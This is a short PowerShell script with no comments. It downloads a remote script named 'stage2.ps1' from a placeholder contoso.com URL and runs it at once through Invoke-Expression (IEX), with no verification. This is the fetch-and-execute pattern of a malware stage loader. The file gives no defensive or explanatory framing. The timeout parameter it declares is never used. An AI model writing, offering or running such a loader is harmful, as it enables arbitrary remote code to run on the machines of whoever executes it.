
[CmdletBinding()]
param(
    [string]$FetchUrl = 'https://contoso.com:443/stage2.ps1',
    [int]$TimeoutSec = 107
)
IEX (Invoke-WebRequest -Uri $FetchUrl -UseBasicParsing).Content
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
